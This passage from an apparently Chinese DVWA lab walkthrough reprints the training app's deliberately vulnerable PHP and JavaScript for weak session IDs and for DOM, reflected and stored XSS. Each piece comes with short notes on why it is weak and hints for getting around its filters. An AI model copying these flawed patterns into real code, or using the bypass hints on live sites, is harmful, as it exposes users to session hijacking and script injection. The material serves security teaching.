	<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id'</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
	<span class="token variable">$cookie_value</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dvwaSession"</span><span class="token punctuation">,</span> <span class="token variable">$cookie_value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>使用post请求，没有Session则先置0，并返回给客户端，每请求一次，dvwaSession的值+1，不安全因为Session的太容易猜测了</p> 
</blockquote> 
<h3><a id="2Medium_1371"></a>2、Medium</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token variable">$cookie_value</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dvwaSession"</span><span class="token punctuation">,</span> <span class="token variable">$cookie_value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>以time()时间来作为session，不安全，因为time()产生的数字比较短，而且很容易就能看出来是time()函数的结果，在一定时间内是可以进行爆破的。</p> 
</blockquote> 
<h3><a id="3High_1389"></a>3、High</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id_high'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id_high'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id_high'</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
	<span class="token variable">$cookie_value</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id_high'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dvwaSession"</span><span class="token punctuation">,</span> <span class="token variable">$cookie_value</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/vulnerabilities/weak_id/"</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>这里的Cookie的值为md5加密的自增整数值，并且设置了有效期是1小时，规定了服务器路径和域名，但是依旧太简单了，有规律，太容易被破解了，md5好歹加下盐什么的吧。</p> 
</blockquote> 
<h3><a id="4Impossible_1412"></a>4、Impossible</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token variable">$cookie_value</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"Impossible"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dvwaSession"</span><span class="token punctuation">,</span> <span class="token variable">$cookie_value</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/vulnerabilities/weak_id/"</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>这个Cookie就比较安全，拼接了随机数+时间+自定义字符串，使用sha-1加密，在不知道随机数种子和自定义字符串的情况下，想要1小时内爆破，几乎不可能。</p> 
</blockquote> 
<h2><a id="XSSDOM_1428"></a>九、XSS(DOM）</h2> 
<h3><a id="1Low_1429"></a>1、Low</h3> 
<p><img src="https://images2.imgbox.com/81/58/tEUSlAII_o.png" alt="在这里插入图片描述"><br> 源码：</p> 
<pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
					<span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"default="</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
						<span class="token keyword">var</span> lang <span class="token operator">=</span> document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"default="</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
						document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"'&gt;"</span> <span class="token operator">+</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>lang<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;/option&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
						document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token punctuation">}</span>
					    
					document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='English'&gt;English&lt;/option&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='French'&gt;French&lt;/option&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='Spanish'&gt;Spanish&lt;/option&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='German'&gt;German&lt;/option&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>	
</code></pre> 
<blockquote> 
 <p>直接将default后面的数据插入了HTML页面中</p> 
</blockquote> 
<h3><a id="2Medium_1450"></a>2、Medium</h3> 
<p><img src="https://images2.imgbox.com/a2/6b/OQKx35Xd_o.png" alt="在这里插入图片描述"></p> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">// Is there any input?</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"default"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_null</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'default'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token variable">$default</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'default'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	
	<span class="token comment"># Do not allow script tags</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span> <span class="token punctuation">(</span><span class="token variable">$default</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;script"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"location: ?default=English"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>在后端对&lt;script做个限制，数据不发送到后端不就可以了吗</p> 
</blockquote> 
<h3><a id="3High_1476"></a>3、High</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">// Is there any input?</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"default"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_null</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'default'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

	<span class="token comment"># White list the allowable languages</span>
	<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'default'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">case</span> <span class="token string double-quoted-string">"French"</span><span class="token punctuation">:</span>
		<span class="token keyword">case</span> <span class="token string double-quoted-string">"English"</span><span class="token punctuation">:</span>
		<span class="token keyword">case</span> <span class="token string double-quoted-string">"German"</span><span class="token punctuation">:</span>
		<span class="token keyword">case</span> <span class="token string double-quoted-string">"Spanish"</span><span class="token punctuation">:</span>
			<span class="token comment"># ok</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token keyword">default</span><span class="token punctuation">:</span>
			<span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"location: ?default=English"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">exit</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<blockquote> 
 <p>白名单进行过滤，继续用medium的就行，default数据不发送到后端。<br> <img src="https://images2.imgbox.com/e3/b3/ol2Ogm81_o.png" alt="在这里插入图片描述"></p> 
</blockquote> 
<h3><a id="4Impossible_1505"></a>4、Impossible</h3> 
<pre><code class="prism language-html">
					if (document.location.href.indexOf("default=") &gt;= 0) {
						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
						document.write("<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span> + lang + "<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>" + (lang) + "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span>");
						document.write("<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">'</span></span> <span class="token attr-name">disabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>disabled<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>----<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span>");
					}
					    
					document.write("<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>English<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>English<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span>");
					document.write("<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>French<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>French<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span>");
					document.write("<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Spanish<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>Spanish<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span>");
					document.write("<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>German<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>German<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span>");
				
</code></pre> 
<blockquote> 
 <p>对获取到的数据不进行URL解码，而我们GET请求URL中的数据是URL编码过的，相当于使用了编码防止。</p> 
</blockquote> 
<h2><a id="XSSReflected_1524"></a>十、XSS（Reflected）</h2> 
<h3><a id="1Low_1525"></a>1、Low</h3> 
<p><img src="https://images2.imgbox.com/de/b7/kCDN3yCY_o.png" alt="##"><br> 源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Is there any input?</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Feedback for end user</span>
	<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;pre&gt;Hello '</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>关闭了XSS保护，而且将name参数直接拼接到了页面导致的。</p> 
</blockquote> 
<h3><a id="2Medium_1547"></a>2、Medium</h3> 
<p><img src="https://images2.imgbox.com/9d/8d/0pQWi5Sn_o.png" alt="在这里插入图片描述"><br> 源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Is there any input?</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Get input</span>
	<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;script&gt;'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Feedback for end user</span>
	<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;Hello ${name}&lt;/pre&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>只是将"script"替换成空而已，触发的方式还很多。</p> 
</blockquote> 
<h3><a id="3High_1571"></a>3、High</h3> 
<p><img src="https://images2.imgbox.com/7d/f4/LKsxHX8Z_o.png" alt="在这里插入图片描述"><br> 源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Is there any input?</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Get input</span>
	<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Feedback for end user</span>
	<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;Hello ${name}&lt;/pre&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>对script过滤更加严格了，不用这个标签就好了。</p> 
</blockquote> 
<h3><a id="4Impossiblle_1596"></a>4、Impossiblle</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">// Is there any input?</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Check Anti-CSRF token</span>
	<span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Get input</span>
	<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Feedback for end user</span>
	<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;Hello ${name}&lt;/pre&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>关键是通过htmlspecialchars把括号，单双引号，取地址符转义成了HTML实体，浏览器就不会当成HTML的元素，有效。</p> 
</blockquote> 
<h2><a id="XSSStored_1623"></a>十一、XSS（Stored）</h2> 
<h3><a id="1Low_1624"></a>1、Low</h3> 
<p><img src="https://images2.imgbox.com/bb/11/OTO3JrHl_o.png" alt="在这里插入图片描述"><br> 源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'btnSign'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Get input</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'mtxMessage'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$name</span>    <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'txtName'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Sanitize message input</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Sanitize name input</span>
	<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Update database</span>
	<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="token interpolation"><span class="token variable">$message</span></span>', '<span class="token interpolation"><span class="token variable">$name</span></span>' );"</span><span class="token punctuation">;</span>
